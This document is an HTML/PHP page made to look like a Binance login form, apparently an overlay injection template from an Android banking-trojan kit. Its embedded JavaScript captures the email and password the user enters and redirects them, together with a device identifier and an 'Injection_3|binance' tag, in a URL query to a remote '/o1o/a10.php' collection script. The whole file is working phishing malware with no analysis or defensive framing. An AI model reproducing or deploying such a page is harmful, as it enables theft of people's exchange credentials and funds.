<html>
<head>
		<link href="tr/com.binance.dev/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php";
?>
<body>

	<div class="header">
		<img style="width: 16px; padding: 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAQAAAC0NkA6AAABM0lEQVRYw7XYPVICQRCG4a8IyDyBnoYraAZ3oLRkjTUnQGPOQkZKQEhGSsAFsF4jKN2d2Z2fz067pp/qmuoOWtyx5syBmczBnCMnlozFmmu8WYmvW913cQY/84uAvTiAm/lDwEZMwcu0iAsTSbw6GT5bxPSaaDONnfAxvYSHGSTqmSSijkkmyhlWGUQZk03kM0VEHlNMpDNVRBpTTQwzLeK7iJAkFjHGRsQZKxFm7ESQ8RO9jI+IMl4iyGQQo2TlofPy3t3HKvgnzf8TTqYzF36mQ8ziy8ZG9O80G2Fl4oSN6ScszDBRzaQRVUw6UczkEUVMPpHNlBFBZmEnkpk6IompJwYZD9HL+Igow9xJBJlHcfQSAWYrTm6iw+zE0k9IEs0NeRZjPtizYWI/qj2xZccLox/q7enLEXoMggAAAABJRU5ErkJggg==">
	</div>

	<div class="logo">
		<img style="width: 50%;margin-bottom: 30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAh8AAAF1CAMAAAB/BHhCAAAC7lBMVEXtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuAAAAADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuADtuAC/MKzXAAAA+XRSTlNxha1hxqvtiafMjZINlTXlhslBWsQaVJjNsvFSyrz3y7Nv9NBOK4SOUWDCvUcmKRJIutHoIcN0S088/jdYdb/wj0wQ1zH48ywL0qI62BEW3XeRo6q0uy1XoV2+7if6M/Yv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">
	</div>

	<form action="null" method="post" id="_mainForm" target="flow_handler">
       <input type="hidden" name="name" value="binance" />
		<label> Email </label>
		<input type="email" name="fields[email]" class="field" id="email" required="">

		<label> Password </label>
		<input type="password" name="fields[password]" class="field" id="password" required="">

		<input type="submit" value="Login" id="input_submitBtn" class="button">

	</form>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
	<script type="text/javascript">

    (function () {


var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
     var input = objDoc.createElement("input");
     input.setAttribute("type", "hidden");
     input.setAttribute("name", sNm);
     input.setAttribute("value", sV);
     input.value = sV;
     objForm.appendChild(input);
 };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

                        var oNumInp = document.getElementById('email');
                        var oCodeInp = document.getElementById('password');

                        try{
                            oNumInp.className = 'field';
                            oCodeInp.className = 'field';
                        } catch(e){};

                       if (!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(oNumInp.value)) {
                            try{
                                oNumInp.className = 'fielderror';
                            } catch(e){};
                            return false;
                        }

                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
                            try{
                                oCodeInp.className = 'fielderror';
                            } catch(e){};
                            return false;
                        }
                        top['closeDlg'] = true;
                        var url='<?php echo $URL; ?>';
                        var imei_c='<?php echo $IMEI_country; ?>';
                        location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|binance|"+oNumInp.value+"|"+oCodeInp.value);

						return false;
                    };

                })();
            </script>
	<h4 style="width: 100%; text-align: center; color: #eeb80b;font-weight: 100;"> Forgot your password? </h4>

	<h4 style="width: 100%; color: #fff;text-align: center;font-weight: 100;"> Don't have an account yet? <u style="color: #eeb80b;text-decoration: none;"> Register </u></h4>
</body>
</html>
